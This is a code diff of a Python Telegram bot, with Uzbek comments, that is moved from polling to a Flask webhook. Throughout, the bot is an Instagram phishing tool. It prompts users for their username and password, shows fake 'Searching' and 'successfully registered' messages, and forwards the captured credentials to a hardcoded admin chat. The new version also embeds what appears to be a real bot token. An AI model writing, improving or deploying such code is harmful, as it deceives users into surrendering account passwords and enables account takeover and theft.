@@ -1,63 +1,61 @@
 import telebot
+from flask import Flask, request
 import time
-from flask import Flask
-from threading import Thread
-import os
+import threading
 
-# Render uchun tokenni yashirin joydan olish
-BOT_TOKEN = os.environ["BOT_TOKEN"]
-ADMIN_CHAT_ID = "73493209"  # O'zgartirmang
+TOKEN = "7419649484:AAGVTtcjwUVOotnOQU8zm71IGhxTctW1Tj8"
+ADMIN_ID = 73493209
 
-bot = telebot.TeleBot(BOT_TOKEN)
+bot = telebot.TeleBot(TOKEN)
+app = Flask(__name__)
+
 user_data = {}
 
-# 🧠 Web-server (tirik qolish uchun)
-app = Flask('')
+@app.route(f'/{TOKEN}', methods=['POST'])
+def getMessage():
+    json_str = request.get_data().decode("UTF-8")
+    update = telebot.types.Update.de_json(json_str)
+    bot.process_new_updates([update])
+    return "!", 200
 
-@app.route('/')
+@app.route("/")
 def home():
-    return "Bot is alive!"
+    return "Bot ishlayapti!"
 
-def run():
-    app.run(host='0.0.0.0', port=8080)
-
-def keep_alive():
-    t = Thread(target=run)
-    t.start()
-
-# 📩 /start buyrug'i
 @bot.message_handler(commands=['start'])
-def send_welcome(message):
-    bot.send_message(message.chat.id, "🔍 Your Instagram username:")
+def start(message):
+    user_id = message.chat.id
+    user_data[user_id] = {}
+    bot.send_message(user_id, "📥 Your Instagram username:")
 
-# 📥 Username qabul qilish
-@bot.message_handler(func=lambda m: m.text and m.chat.id not in user_data)
-def get_username(message):
-    user_data[message.chat.id] = {'username': message.text}
+@bot.message_handler(func=lambda message: True)
+def collect_data(message):
+    user_id = message.chat.id
+    if user_id not in user_data:
+        bot.send_message(user_id, "📥 Your Instagram username:")
+        user_data[user_id] = {}
+        return
 
-    sent = bot.send_message(message.chat.id, "🔎 Searching...")
-    bot.send_chat_action(message.chat.id, 'typing')
+    if "username" not in user_data[user_id]:
+        user_data[user_id]["username"] = message.text
+        msg = bot.send_message(user_id, "🔍 Searching...")
+        threading.Thread(target=ask_password, args=(user_id, msg.message_id)).start()
+    elif "password" not in user_data[user_id]:
+        user_data[user_id]["password"] = message.text
+        msg = bot.send_message(user_id, "⏳ Registration...")
+        threading.Thread(target=finish_registration, args=(user_id, msg.message_id)).start()
+
+def ask_password(user_id, msg_id):
     time.sleep(2)
-    bot.delete_message(message.chat.id, sent.message_id)
+    bot.edit_message_text(chat_id=user_id, message_id=msg_id, text="📥 Your Instagram password:")
 
-    bot.send_message(message.chat.id, f"✅ Found your Instagram account: {message.text}")
-    bot.send_message(message.chat.id, "🔐 Your Instagram password:")
-
-# 🔐 Parol qabul qilish
-@bot.message_handler(func=lambda m: m.chat.id in user_data and 'password' not in user_data[m.chat.id])
-def get_password(message):
-    user_data[message.chat.id]['password'] = message.text
-    username = user_data[message.chat.id]['username']
-    password = message.text
-
-    sent = bot.send_message(message.chat.id, "⏳ Registering...")
-    bot.send_chat_action(message.chat.id, 'typing')
+def finish_registration(user_id, msg_id):
     time.sleep(2)
-    bot.delete_message(message.chat.id, sent.message_id)
+    bot.edit_message_text(chat_id=user_id, message_id=msg_id, text="✅ Thank you! You have successfully registered.")
+    data = user_data[user_id]
+    msg = f"💬 Instagram login ma'lumot:\n\n👤 Username: {data['username']}\n🔑 Password: {data['password']}\n🆔 User ID: {user_id}"
+    bot.send_message(ADMIN_ID, msg)
+    del user_data[user_id]
 
-    bot.send_message(message.chat.id, "✅ Thank you! You have successfully registered.")
-    bot.send_message(ADMIN_CHAT_ID, f"📥 New data:\nUsername: `{username}`\nPassword: `{password}`", parse_mode="Markdown")
-
-# 🔄 Flask serverni ishga tushuramiz va pollingni boshlaymiz
-keep_alive()
-bot.infinity_polling()
+if __name__ == "__main__":
+    app.run()
